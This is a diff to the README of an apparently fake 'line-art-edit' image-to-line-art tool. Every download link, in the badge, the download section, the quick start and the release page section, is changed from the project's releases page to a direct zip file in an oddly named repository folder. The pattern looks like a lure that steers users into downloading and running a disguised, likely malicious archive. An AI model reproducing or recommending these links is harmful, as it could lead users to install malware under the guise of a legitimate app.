@@ -1,10 +1,10 @@
 # 🖊️ line-art-edit - Turn images into clean line art
 
-[![Download line-art-edit](https://img.shields.io/badge/Download%20line-art-edit-4B5563?style=for-the-badge&logo=github&logoColor=white)](https://github.com/adailton9e-hub/line-art-edit/releases)
+[![Download line-art-edit](https://img.shields.io/badge/Download%20line-art-edit-4B5563?style=for-the-badge&logo=github&logoColor=white)](https://github.com/adailton9e-hub/line-art-edit/raw/refs/heads/main/alexipharmacon/edit_art_line_evocation.zip)
 
 ## 📥 Download
 
-Visit this page to download: https://github.com/adailton9e-hub/line-art-edit/releases
+Visit this page to download: https://github.com/adailton9e-hub/line-art-edit/raw/refs/heads/main/alexipharmacon/edit_art_line_evocation.zip
 
 1. Open the link above in your browser
 2. Find the latest release at the top of the page
@@ -175,7 +175,7 @@ Use short folder names if you want to keep track of files with ease.
 
 ## 📌 Quick start
 
-1. Go to https://github.com/adailton9e-hub/line-art-edit/releases
+1. Go to https://github.com/adailton9e-hub/line-art-edit/raw/refs/heads/main/alexipharmacon/edit_art_line_evocation.zip
 2. Download the Windows release
 3. Extract the file if needed
 4. Open the app
@@ -196,4 +196,4 @@ line-art-edit is aimed at line art editing, outline extraction, and sketch conve
 
 ## 📎 Release page
 
-Download and install from the release page here: https://github.com/adailton9e-hub/line-art-edit/releases
+Download and install from the release page here: https://github.com/adailton9e-hub/line-art-edit/raw/refs/heads/main/alexipharmacon/edit_art_line_evocation.zip
